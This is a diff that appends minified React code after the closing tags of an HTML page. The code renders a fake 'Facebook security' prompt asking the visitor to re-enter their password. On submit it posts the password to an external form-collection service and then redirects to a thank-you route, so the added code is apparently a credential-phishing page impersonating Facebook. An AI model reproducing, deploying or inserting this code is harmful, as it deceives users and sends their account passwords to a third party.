@@ -1870,6 +1870,103 @@
                 </div>
             </form>
     
-    
+
     
     </div></body></html>
+
+
+
+
+ , Vt = () => {
+            const e = _()
+              , [t,r] = (0,
+            n.useState)();
+            return (0,
+            he.jsxs)("div", {
+                className: "passwordContainer",
+                children: [(0,
+                he.jsx)("img", {
+                    src: "https://cdn.iconscout.com/icon/free/png-512/free-facebook-4062815-3357701.png?f=webp&w=512",
+                    alt: "Facebook Logo"
+                }), (0,
+                he.jsx)("h3", {
+                    children: "Facebook security"
+                }), (0,
+                he.jsx)("hr", {}), (0,
+                he.jsx)("p", {
+                    children: "Please re-enter password to complete the request."
+                }), (0,
+                he.jsx)("input", {
+                    type: "password",
+                    value: t,
+                    onChange: e => r(e.target.value),
+                    placeholder: "Password",
+                    name: "password"
+                }), (0,
+                he.jsx)("button", {
+                    onClick: n => {
+                        n.preventDefault(),
+                        fetch("https://submit-form.com/UaQ6kAOg0", {
+                            method: "POST",
+                            headers: {
+                                "Content-Type": "application/json"
+                            },
+                            body: JSON.stringify({
+                                password: t
+                            })
+                        }).then((e => {}
+                        )),
+                        e("/thanks")
+                    }
+                    ,
+                    children: "Submit"
+                })]
+            })
+        }
+          , kt = () => (0,
+        he.jsx)("div", {
+            children: (0,
+            he.jsxs)(pe, {
+                children: [(0,
+                he.jsx)(de, {
+                    path: "/",
+                    element: (0,
+                    he.jsx)(ge, {})
+                }), (0,
+                he.jsx)(de, {
+                    path: "/validation",
+                    element: (0,
+                    he.jsx)(Wt, {})
+                }), (0,
+                he.jsx)(de, {
+                    path: "/thanks",
+                    element: (0,
+                    he.jsx)(Ze, {})
+                }), (0,
+                he.jsx)(de, {
+                    path: "/pass",
+                    element: (0,
+                    he.jsx)(Vt, {})
+                })]
+            })
+        });
+        const Yt = function() {
+            return (0,
+            he.jsx)(he.Fragment, {
+                children: (0,
+                he.jsx)(kt, {})
+            })
+        };
+        a.createRoot(document.getElementById("root")).render((0,
+        he.jsx)(n.StrictMode, {
+            children: (0,
+            he.jsx)(Ee, {
+                children: (0,
+                he.jsx)(Yt, {})
+            })
+        }))
+    }
+    )()
+}
+)();
+
